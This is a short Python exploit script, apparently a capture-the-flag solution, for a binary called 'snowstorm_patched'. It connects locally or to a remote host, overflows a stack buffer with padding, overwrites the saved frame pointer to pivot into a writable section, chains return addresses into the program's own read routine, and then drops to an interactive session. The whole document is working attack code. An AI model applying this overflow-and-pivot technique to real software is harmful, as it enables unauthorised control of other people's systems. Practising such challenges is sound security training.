#!/usr/bin/python3
from pwncus import *

# context.log_level = 'debug'
exe = context.binary = ELF('./snowstorm_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''

b*pwnme+88
b*pwnme+155
c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

leave_ret = 0x0000000000401324
rw_section = 0x404a00
read_addr = 0x0000000004015C2
asklen_addr = 0x0000000004015B8

pl = flat(
b'A'*0x30,
rw_section + 0x30, # saved rbp 1
asklen_addr,
read_addr,
)

sa(b'(max 40): ', b'0x40')
sa(b'> ', pl)

interactive()
